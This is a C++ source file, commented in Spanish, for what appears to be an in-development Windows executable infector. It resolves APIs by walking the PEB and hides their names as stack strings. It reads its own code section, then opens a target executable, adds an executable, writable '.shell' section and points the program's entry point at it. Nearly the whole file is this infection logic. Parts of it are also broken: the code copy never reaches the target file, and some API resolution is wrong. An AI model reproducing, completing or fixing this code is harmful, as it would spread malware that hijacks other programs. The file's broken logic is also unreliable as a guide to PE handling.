#include <Windows.h>
#include "peb-lookup.h"

// Strings almacenados en la secci�n .text
#pragma code_seg(".text")

__declspec(allocate(".text"))
wchar_t kernel32_str[] = L"kernel32.dll";

__declspec(allocate(".text"))
char load_lib_str[] = "LoadLibraryA";


// Stack based strings for libraries and functions the shellcode needs
wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
char load_lib_name[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
char get_proc_name[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
char kr32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
char ucrtbase_dll_name[] = { 'u','c','r','t','b','a','s','e','.','d','l','l' };

char message_box_name[] = { 'M','e','s','s','a','g','e','B','o','x','W', 0 };
char cf_name[] = { 'C','r','e','a','t','e','F','i','l','e','A', 0 };
char rf_name[] = { 'R','e','a','d','F','i','l','e', 0 };
char close_handle_name[] = { 'C','l','o','s','e','H','a','n','d','l','e', 0 };
char mb_to_wc_name[] = { 'M','u','l','t','i','B','y','t','e','T','o','W','i','d','e','C','h','a','r', 0 };
char strncmp_name[] = { 's','t','r','n','c','m','p', 0 };
char get_file_size_name[] = { 'G','e','t','F','i','l','e','S','i','z','e', 0 };
char map_view_of_file_name[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
char unmap_view_of_file_name[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
char create_file_mapping_name[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0 };
// stack based strings to be passed to the messagebox win api
wchar_t msg_content[] = { 'H','e','l','l','o', ' ', 'W','o','r','l','d','!', 0 };
wchar_t msg_title[] = { 'D','e','m','o','!', 0 };
char  fileName[] = { 'c', '-', 's','h','e','l','l','c','o','d','e','.','e','x','e', 0 };
char  fileName_vic[] = { 'y', 'u', 's','k','o','v','i','c','.','e','x','e', 0 };
// Nombre de la funci�n
char func_name[] = { 's','t','r','n','c','m','p',0 };
// Read the file
const DWORD bufferSize = 64;
char buffer[bufferSize] = { 0 };
DWORD bytesRead;
wchar_t wide_buffer[bufferSize]; // Crear un buffer Unicode

// Definici�n de punteros a funci�nes
typedef int (*strncmp_fn)(const char*, const char*, size_t);

typedef BOOL(*CloseHandle_fn)(HANDLE hObject);

typedef BOOL(*UnmapViewOfFile_fn)(LPCVOID lpBaseAddress);

typedef HANDLE(*CreateFileMapping_fn)(
    HANDLE hFile,
    LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
    DWORD flProtect,
    DWORD dwMaximumSizeHigh,
    DWORD dwMaximumSizeLow,
    LPCSTR lpName
    );

typedef LPVOID(*MapViewOfFile_fn)(
    HANDLE hFileMappingObject,
    DWORD dwDesiredAccess,
    DWORD dwFileOffsetHigh,
    DWORD dwFileOffsetLow,
    SIZE_T dwNumberOfBytesToMap
    );

// Definici�n del puntero de funci�n para strcpy_s
typedef errno_t(CDECL* strcpy_s_fn)(
    char* dest,
    size_t destsz,
    const char* src
    );

// Definici�n del puntero de funci�n para ZeroMemory
typedef void (WINAPI* ZeroMemory_fn)(PVOID, SIZE_T);

// Definici�n del puntero de funci�n para SetFilePointer
typedef DWORD(WINAPI* SetFilePointer_fn)(
    HANDLE hFile,
    LONG lDistanceToMove,
    PLONG lpDistanceToMoveHigh,
    DWORD dwMoveMethod
    );

// Definici�n del puntero de funci�n para SetEndOfFile
typedef BOOL(WINAPI* SetEndOfFile_fn)(HANDLE hFile);

// Definici�n del nombre de la funci�n malloc
char malloc_name[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };

// Declaraci�n del tipo de puntero a la funci�n malloc
typedef void* (*malloc_fn)(size_t);  // Tipo de puntero para malloc

// Definici�n del nombre de la funci�n memcpy
char memcpy_name[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };

// Declaraci�n del tipo de puntero a la funci�n memcpy
typedef void* (*memcpy_fn)(void* dest, const void* src, size_t n);  // Tipo de puntero para memcpy

// Funci�n para copiar la secci�n .text a .shell
bool CopyTextToShell(LPVOID exeBase, DWORD textSectionSize, malloc_fn _malloc, memcpy_fn _memcpy) {
    DWORD shellSectionSize = textSectionSize;  // O ajusta seg�n sea necesario

    // Crear la secci�n .shell en la memoria mapeada
    void* shellSection = _malloc(shellSectionSize); // O usa mapeo de memoria si es necesario
    if (!shellSection) {
        return false;
    }

    // Copiar el contenido de la secci�n .text a .shell
    _memcpy(shellSection, exeBase, shellSectionSize); // Ajusta el puntero seg�n la ubicaci�n de la secci�n .shell

    // Aqu� puedes modificar el encabezado del archivo PE si es necesario para incluir la nueva secci�n .shell

    return true;
}

bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic, CloseHandle_fn _CloseHandle, UnmapViewOfFile_fn _UnmapViewOfFile , CreateFileMapping_fn _CreateFileMapping , MapViewOfFile_fn _MapViewOfFile , strcpy_s_fn _strcpy_s, ZeroMemory_fn _ZeroMemory, SetFilePointer_fn _SetFilePointer , SetFilePointer_fn _SetEndOfFile) {

   
    HANDLE hMapping = _CreateFileMapping(hFile_vic, nullptr, PAGE_READWRITE, 0, 0, nullptr);
    if (!hMapping) {
      //  std::cerr << "Error al crear el mapping de archivo.\n";
        _CloseHandle(hFile_vic);
        return false;
    }

    BYTE* pBase = (BYTE*)_MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
    if (!pBase) {
        //std::cerr << "Error al mapear el archivo en memoria.\n";
        _CloseHandle(hMapping);
        _CloseHandle(hFile_vic);
        return false;
    }

    // Obt�n las estructuras principales del archivo PE
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        //std::cerr << "El archivo no es un PE v�lido.\n";
        _UnmapViewOfFile(pBase);
        _CloseHandle(hMapping);
        _CloseHandle(hFile_vic);
        return false;
    }

    PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(pBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
       // std::cerr << "El archivo no contiene una cabecera NT v�lida.\n";
        _UnmapViewOfFile(pBase);
        _CloseHandle(hMapping);
        _CloseHandle(hFile_vic);
        return false;
    }

    PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);
    int numberOfSections = ntHeaders->FileHeader.NumberOfSections;

    // Configura una nueva secci�n
    PIMAGE_SECTION_HEADER newSection = &sectionHeaders[numberOfSections];
    _ZeroMemory(newSection, sizeof(IMAGE_SECTION_HEADER));
    _strcpy_s((char*)newSection->Name, IMAGE_SIZEOF_SHORT_NAME, ".shell");

    newSection->Misc.VirtualSize = 0x1000; // Tama�o virtual de la secci�n
    newSection->VirtualAddress = ALIGN_UP(sectionHeaders[numberOfSections - 1].VirtualAddress + sectionHeaders[numberOfSections - 1].Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
    newSection->SizeOfRawData = ALIGN_UP(0x1000, ntHeaders->OptionalHeader.FileAlignment);
    newSection->PointerToRawData = ALIGN_UP(sectionHeaders[numberOfSections - 1].PointerToRawData + sectionHeaders[numberOfSections - 1].SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
    newSection->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;

    // Actualiza los encabezados del PE
    ntHeaders->FileHeader.NumberOfSections += 1;
    ntHeaders->OptionalHeader.SizeOfImage = newSection->VirtualAddress + newSection->Misc.VirtualSize;

    // Modifica el Entry Point
    ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;

    // Aseg�rate de escribir la nueva secci�n en el archivo
    _SetFilePointer(hFile_vic, newSection->PointerToRawData + newSection->SizeOfRawData, nullptr, FILE_BEGIN);
    _SetEndOfFile(hFile_vic);

    // Limpia los recursos
    _UnmapViewOfFile(pBase);
    _CloseHandle(hMapping);
    _CloseHandle(hFile_vic);

    //std::cout << "Secci�n .shell agregada y Entry Point modificado con �xito.\n";
    return true;
}

// Funci�n auxiliar para alinear valores
DWORD ALIGN_UP(DWORD size, DWORD align) {
    return (size + align - 1) & ~(align - 1);
}


void* GetTextSection(void* exeBase, DWORD* sectionSize, strncmp_fn strncmp_func) {



    // Obtener el encabezado DOS
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)exeBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL; // No es un archivo v�lido
    }

    // Obtener el encabezado NT
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)exeBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL; // Encabezado NT inv�lido
    }

    // Obtener la tabla de secciones
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);

    // Iterar por las secciones
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strncmp_func((char*)sectionHeaders[i].Name, ".text", 5) == 0) {
            *sectionSize = sectionHeaders[i].Misc.VirtualSize;
            return (void*)((BYTE*)exeBase + sectionHeaders[i].VirtualAddress);
        }
    }

    return NULL; // Secci�n .text no encontrada
}

int main() {
 
    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
    if (!base) {
        return 1;
    }

    // resolve loadlibraryA() address
    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
    if (!load_lib) {
        return 2;
    }

    // resolve getprocaddress() address
    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
    if (!get_proc) {
        return 3;
    }



    // loadlibrarya and getprocaddress function definitions
    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
        = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;

    // load user32.dll
    LPVOID u32_dll = _LoadLibraryA(user32_dll_name);
    // load kernell32.dll
    LPVOID k32_dll = _LoadLibraryA(kr32_dll_name);
    // Cargar la biblioteca (reemplazar con la biblioteca correcta si aplica)
    LPVOID hLibC = _LoadLibraryA(ucrtbase_dll_name); // Biblioteca est�ndar C para Windows
   
    DWORD(WINAPI * _GetFileSize)(
        _In_ HANDLE hFile,
        _Out_opt_ LPDWORD lpFileSizeHigh
        ) = (DWORD(WINAPI*)(
            HANDLE, LPDWORD)) _GetProcAddress((HMODULE)k32_dll, get_file_size_name);

    LPVOID(WINAPI * _MapViewOfFile)(
        _In_ HANDLE hFileMappingObject,
        _In_ DWORD dwDesiredAccess,
        _In_ DWORD dwFileOffsetHigh,
        _In_ DWORD dwFileOffsetLow,
        _In_ SIZE_T dwNumberOfBytesToMap
        ) = (LPVOID(WINAPI*)(
            HANDLE, DWORD, DWORD, DWORD, SIZE_T)) _GetProcAddress((HMODULE)k32_dll, map_view_of_file_name);

    BOOL(WINAPI * _UnmapViewOfFile)(
        _In_ LPCVOID lpBaseAddress
        ) = (BOOL(WINAPI*)(
            LPCVOID)) _GetProcAddress((HMODULE)k32_dll, unmap_view_of_file_name);

    HANDLE(WINAPI * _CreateFileMappingA)(
        _In_ HANDLE hFile,
        _In_opt_ LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
        _In_ DWORD flProtect,
        _In_ DWORD dwMaximumSizeHigh,
        _In_ DWORD dwMaximumSizeLow,
        _In_opt_ LPCSTR lpName
        ) = (HANDLE(WINAPI*)(
            HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR)) _GetProcAddress((HMODULE)k32_dll, create_file_mapping_name);

    // Verificar si se resolvieron correctamente
    if (!_GetFileSize || !_MapViewOfFile || !_UnmapViewOfFile || !_CreateFileMappingA) {
        
        return -1;
    }
    HANDLE(WINAPI * _CreateFileA)(
        _In_ LPCSTR lpFileName,
        _In_ DWORD dwDesiredAccess,
        _In_ DWORD dwShareMode,
        _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        _In_ DWORD dwCreationDisposition,
        _In_ DWORD dwFlagsAndAttributes,
        _In_opt_ HANDLE hTemplateFile
        ) = (HANDLE(WINAPI*)(
            _In_ LPCSTR,
            _In_ DWORD,
            _In_ DWORD,
            _In_opt_ LPSECURITY_ATTRIBUTES,
            _In_ DWORD,
            _In_ DWORD,
            _In_opt_ HANDLE
            )) _GetProcAddress((HMODULE)k32_dll, cf_name);

    if (_CreateFileA == INVALID_HANDLE_VALUE)return 3;

    // Declarar el puntero a la funci�n ReadFile
    // Define ReadFile
    BOOL(WINAPI * _ReadFile)(
        HANDLE hFile,
        LPVOID lpBuffer,
        DWORD nNumberOfBytesToRead,
        LPDWORD lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped
        ) = (BOOL(WINAPI*)(
            HANDLE,
            LPVOID,
            DWORD,
            LPDWORD,
            LPOVERLAPPED)) _GetProcAddress((HMODULE)k32_dll, rf_name);

    if (!_ReadFile) return 4;

    // messageboxw function definition
    int (WINAPI * _MessageBoxW)(
        _In_opt_ HWND hWnd,
        _In_opt_ LPCWSTR lpText,
        _In_opt_ LPCWSTR lpCaption,
        _In_ UINT uType) = (int (WINAPI*)(
            _In_opt_ HWND,
            _In_opt_ LPCWSTR,
            _In_opt_ LPCWSTR,
            _In_ UINT)) _GetProcAddress((HMODULE)u32_dll, message_box_name);

    if (_MessageBoxW == NULL) return 5;

    // Resolver la direcci�n de MultiByteToWideChar
    int (WINAPI * _MultiByteToWideChar)(
        _In_ UINT CodePage,
        _In_ DWORD dwFlags,
        _In_NLS_string_(cbMultiByte) LPCCH lpMultiByteStr,
        _In_ int cbMultiByte,
        _Out_writes_opt_(cchWideChar) LPWSTR lpWideCharStr,
        _In_ int cchWideChar
        ) = (int (WINAPI*)(
            UINT, DWORD, LPCCH, int, LPWSTR, int)) _GetProcAddress((HMODULE)k32_dll, mb_to_wc_name);
    // Resolver la direcci�n de CloseHandle
    BOOL(WINAPI * _CloseHandle)(HANDLE hObject);
    _CloseHandle = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress((HMODULE)k32_dll, close_handle_name);

    // Declaraci�n del puntero a funci�n para strncmp
    int (WINAPI * _strncmp)(
        _In_ const char* str1,
        _In_ const char* str2,
        _In_ size_t num
        ) = (int (WINAPI*)(
            const char*, const char*, size_t))  _GetProcAddress((HMODULE)hLibC, strncmp_name);

    if (!_strncmp) {
       
 
        return -1;
    }

    // Definici�n de strcpy_s similar a MessageBoxW
    errno_t(CDECL * _strcpy_s)(
        char* dest,
        size_t destsz,
        const char* src
        ) = (errno_t(CDECL*)(
            char*,
            size_t,
            const char*
            )) GetProcAddress(GetModuleHandleA("ucrtbase.dll"), "strcpy_s");
    if (!_strcpy_s) {


        return -1;
    }

    // Definici�n de _ZeroMemory
    void (WINAPI * _ZeroMemory)(
        PVOID ptr,
        SIZE_T size
        ) = (void (WINAPI*)(
            PVOID,
            SIZE_T
            )) GetProcAddress(GetModuleHandleA("kernel32.dll"), "ZeroMemory");

    // Definici�n de _SetFilePointer
    DWORD(WINAPI * _SetFilePointer)(
        HANDLE hFile,
        LONG lDistanceToMove,
        PLONG lpDistanceToMoveHigh,
        DWORD dwMoveMethod
        ) = (DWORD(WINAPI*)(
            HANDLE,
            LONG,
            PLONG,
            DWORD
            )) GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetFilePointer");

    // Definici�n de _SetEndOfFile

    BOOL(WINAPI * _SetEndOfFile)(HANDLE hFile_vic) = (BOOL(WINAPI*)(HANDLE)) GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetEndOfFile");
    // Declaraci�n del puntero a funci�n para malloc
    void* (WINAPI * _malloc)(size_t size) = (malloc_fn)_GetProcAddress((HMODULE)hLibC, malloc_name);

    // Comprobaci�n de error en malloc
    if (!_malloc) {
        return -1; // Error si no se encuentra malloc
    }

    // Declaraci�n del puntero a funci�n para memcpy
    void* (WINAPI * _memcpy)(void* dest, const void* src, size_t n) = (memcpy_fn)_GetProcAddress((HMODULE)hLibC, memcpy_name);

    // Comprobaci�n de error en memcpy
    if (!_memcpy) {
        return -1; // Error si no se encuentra memcpy
    }
    // invoke the message box winapi
    _MessageBoxW(0, msg_content, msg_title, MB_OK);

    HANDLE hFile = _CreateFileA(
        fileName,              // Nombre del archivo
        GENERIC_READ,          // Permisos de lectura
        0,                     // No compartir
        NULL,                  // Seguridad predeterminada
        OPEN_EXISTING,         // Abrir archivo existente
        FILE_ATTRIBUTE_NORMAL, // Atributos normales
        NULL);                 // No hay plantilla de archivo

    if (hFile == INVALID_HANDLE_VALUE) {
        _MessageBoxW(0, L"Error al abrir el archivo", L"Error", MB_OK);
        return 5; // Error al abrir el archivo
    }
    // invoke the message box winapi
    _MessageBoxW(0, msg_content, msg_title, MB_OK);

    if (hFile != INVALID_HANDLE_VALUE) {
        BOOL result = _ReadFile(hFile, buffer, bufferSize - 1, &bytesRead, NULL);
        if (result && bytesRead > 0) {
            // Agregar car�cter nulo para terminar la cadena
            buffer[bytesRead] = '\0';
            // Mostrar contenido le�do (requiere `_MessageBoxW` o `_MultiByteToWideChar`)
            wchar_t wideBuffer[bufferSize] = { 0 };
            _MultiByteToWideChar(CP_ACP, 0, buffer, bytesRead, wideBuffer, bufferSize);
            _MessageBoxW(0, wideBuffer, L"Contenido del Archivo", MB_OK);
        }
        else {
            _MessageBoxW(0, L"No se pudo leer el archivo", L"Error", MB_OK);
        }
        // invoke the message box winapi

        _CloseHandle(hFile);
        // invoke the message box winapi
        _MessageBoxW(0, L"_CloseHandle(hFile)", L"Depuracion", MB_OK);
    }
    else {
        _MessageBoxW(0, L"Error al abrir el archivo", L"Error", MB_OK);
    }



    hFile = _CreateFileA(
        fileName,              // Nombre del archivo
        GENERIC_READ,          // Permisos de lectura
        0,                     // No compartir
        NULL,                  // Seguridad predeterminada
        OPEN_EXISTING,         // Abrir archivo existente
        FILE_ATTRIBUTE_NORMAL, // Atributos normales
        NULL);                 // No hay plantilla de archivo

    if (hFile == INVALID_HANDLE_VALUE) {
        _MessageBoxW(0, L"Error al abrir el archivo", L"Error", MB_OK);
        return 5; // Error al abrir el archivo
    }
    // invoke the message box winapi
    _MessageBoxW(0, L"_CreateFileA", L"Depuracion", MB_OK);

    DWORD fileSize = _GetFileSize(hFile, NULL);
    // invoke the message box winapi
    _MessageBoxW(0, L"GetFileSize(hFile, NULL)", L"Depuracion", MB_OK);

    HANDLE hMapping = _CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        _MessageBoxW(0, L"Error creating file mapping.", L"Error", MB_OK);
        _CloseHandle(hFile);
        return 1;
    }
    // invoke the message box winapi
    _MessageBoxW(0, L"GetFileSize(hFile, NULL)", L"Depuracion", MB_OK);

    void* exeBase = _MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!exeBase) {
        _MessageBoxW(0, L"Error mapping view of file..", L"Error", MB_OK);
        _CloseHandle(hMapping);
        _CloseHandle(hFile);
        return 1;
    }
    // invoke the message box winapi
    _MessageBoxW(0, L"MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)", L"Depuracion", MB_OK);

    DWORD sectionSize = 0;
    void* textSection = GetTextSection(exeBase, &sectionSize, _strncmp);
    if (textSection) {
        _MessageBoxW(0, L"Secci�n .text encontrada.  ", L"Aviso", MB_OK);
    
    }
    else {
        _MessageBoxW(0, L"No se encontr� la secci�n .text.", L"Error", MB_OK);
    }
    // invoke the message box winapi
    _MessageBoxW(0, L"GetTextSection(exeBase, &sectionSize, strncmp_func)", L"Depuracion", MB_OK);

    _UnmapViewOfFile(exeBase);
    // invoke the message box winapi
    _MessageBoxW(0, L"UnmapViewOfFile(exeBase)", L"Depuracion", MB_OK);
    _CloseHandle(hMapping);
    // invoke the message box winapi
    _MessageBoxW(0, L"_CloseHandle(hMapping)", L"Depuracion", MB_OK);

    _CloseHandle(hFile);
    // invoke the message box winapi
    _MessageBoxW(0, L"_CloseHandle(hFile)", L"Depuracion", MB_OK);


    HANDLE hFile_vic = _CreateFileA(
        fileName_vic,              // Nombre del archivo
        GENERIC_READ | GENERIC_WRITE,          // Permisos de lectura
        0,                     // No compartir
        NULL,                  // Seguridad predeterminada
        OPEN_EXISTING,         // Abrir archivo existente
        FILE_ATTRIBUTE_NORMAL, // Atributos normales
        NULL);                 // No hay plantilla de archivo

    if (hFile_vic == INVALID_HANDLE_VALUE) {
        _MessageBoxW(0, L"Error al abrir el archivo vic", L"Error", MB_OK);
        return 5; // Error al abrir el archivo
    }

    bool AddedEntryPoint = AddShellSectionAndModifyEntryPoint(hFile_vic, _CloseHandle, _UnmapViewOfFile, _CreateFileMappingA, _MapViewOfFile, _strcpy_s, _ZeroMemory, _SetFilePointer, _SetEndOfFile);

    // Copiar contenido de .text a .shell
      
    if (CopyTextToShell(exeBase, sectionSize, _malloc, _memcpy)) {
        _MessageBoxW(0, L"Contenido de .text copiado a .shell", L"�xito", MB_OK);
    }
    else {
        _MessageBoxW(0, L"Error al copiar la secci�n .text", L"Error", MB_OK);
    }
    // Limpiar recursos
    _UnmapViewOfFile(exeBase);
    _CloseHandle(hMapping);
    _CloseHandle(hFile_vic);

    return 0;
}